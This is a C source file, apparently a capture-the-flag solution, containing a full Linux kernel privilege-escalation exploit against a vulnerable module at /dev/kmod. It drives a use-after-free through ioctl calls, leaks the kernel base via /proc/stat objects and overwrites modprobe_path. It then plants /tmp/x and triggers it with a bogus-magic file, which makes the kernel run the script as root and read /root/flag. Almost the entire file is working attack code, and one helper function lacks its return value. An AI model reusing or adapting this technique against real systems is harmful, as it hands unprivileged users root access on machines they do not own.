#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <stdint.h>
#include <fcntl.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32 ;
typedef int64_t i64;

#define DEVICE "/dev/kmod"

typedef enum {
    READ=0x13380000,
    WRITE,
    NODE
} CHUNK;

enum {
    CREATE=0x13370000,
    RW,
    DEL
};

#define info(name, value) printf("%s: 0x%lx\n", name, value)
#define calc_addr(name, addr, show) addr+=kbase; (show==1 && addr != kbase) ? info(name, addr) : 1
#define log_error(msg)  \
    do {                \
    perror(msg);        \
    exit(0);            \
    } while(0)

extern u64 user_cs, user_ss, user_rflags, user_sp;
extern u64 kbase, heap_base, heap_leak, commit_creds, prepare_kernel_cred, \
swapgs_restore_regs_and_return_to_usermode, modprobe_path;
extern u32 g_fd;

#define gadget() \
    do { \
    info("kbase", kbase); \
    if (heap_leak) { info("heap_leak", heap_leak); \
    heap_base = heap_leak >> 12 << 12; \
    info("heap_base", heap_base);} \
    calc_addr("commit_creds", commit_creds, 1); \
    calc_addr("prepare_kernel_cred", prepare_kernel_cred, 1); \
    calc_addr("swapgs_restore_regs_and_return_to_usermode", swapgs_restore_regs_and_return_to_usermode, 1); \
    calc_addr("modprobe_path", modprobe_path, 1); \
    } while(0)

typedef struct {
    u64 size;
    u64 idx;
    u64 old_idx;
    u32 option;
    u32 type;
    char* buf;
} request_t;

typedef struct node
{
    struct node* node_chunk;
    void* l_chunk;
} node;

typedef struct 
{
    u64 size;
    u32 key1;
    u32 key2;
    char* buf;
    node* node;
} chunk;
u32 g_fd;


void create(u64 idx, u64 size, CHUNK option, u64 old_idx, u32 type) {
    request_t req = {
        .idx = idx,
        .size = size,
        .option = option,
        .old_idx = old_idx,
        .type = type
    };
    ioctl(g_fd, CREATE, &req);
}

void read_write(u64 idx, u64 size, CHUNK option, char* buf) {
    request_t req = {
        .idx = idx,
        .size = size,
        .option = option,
        .buf = buf
    };
    ioctl(g_fd, RW, &req);
}

void del(u64 idx) {
    request_t req = {
        .idx = idx
    };
    ioctl(g_fd, DEL, &req);
}

u64 user_cs, user_ss, user_rflags, user_sp;
u64 kbase, heap_base, heap_leak, commit_creds, prepare_kernel_cred, \
swapgs_restore_regs_and_return_to_usermode, modprobe_path;


void pin_cpu() {
    cpu_set_t pwn_cpu;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu)){
        log_error("sched_setaffinity");
    }
}

i32 open_c(char *path, i32 flag) {
    i32 fd = open(path, flag);
    if (fd < 0) {
        log_error(path);
    }
}

void save_state(){
    __asm__(
        "mov %%cs, %[cs];"
        "mov %%ss, %[ss];"
        "mov %%rsp, %[sp];"
        "pushf;"
        "pop %[rflags];"
        : [cs]"=r"(user_cs), [ss]"=r"(user_ss), [sp]"=r"(user_sp), [rflags]"=r"(user_rflags)
        :
        : "memory"
    );
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	setbuf(stderr, 0);
    puts("[*] Saved state");
}

int main(int argc, char *argv[]) {
    save_state();
    pin_cpu();
    g_fd = open_c(DEVICE, O_RDWR);

    create(0, 0x20, 0, 0, 0);
    create(1, 0x20, NODE, 0, 1);
    del(0);

    int seqs[2];
    seqs[0] = open_c("/proc/stat", O_RDONLY);
    seqs[1] = open_c("/proc/stat", O_RDONLY);
    u64 buf[4];
    memset(buf, 0, sizeof(buf));
    read_write(1, sizeof(buf), READ, buf);
    kbase = buf[0] - 0x193be0;

    modprobe_path=+0x00e38f00, commit_creds=+0x0007d800, prepare_kernel_cred=+0x0007d9b0, \
    swapgs_restore_regs_and_return_to_usermode=+0x00800f10;
    gadget();
    close(seqs[1]);
    create(0, 0x40, 0, 0, 0);
    del(1);
    create(1, 0x20, 0, 0, 2);


    chunk* fake_chunk = buf;
    fake_chunk->size = 0x20;
    fake_chunk->buf = modprobe_path;
    fake_chunk->key1 = 2;
    fake_chunk->key2 = 2;
    fake_chunk->node = 0;

    read_write(1, sizeof(buf), WRITE, buf);

    read_write(0, 7, WRITE, "/tmp/x");
    system("echo '#!/bin/sh\ncat /root/flag > /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -e '\x29\x07\x20\x03' > /tmp/get_root");
    system("chmod +x /tmp/get_root");
    system("/tmp/get_root");
    system("cat /tmp/flag");
}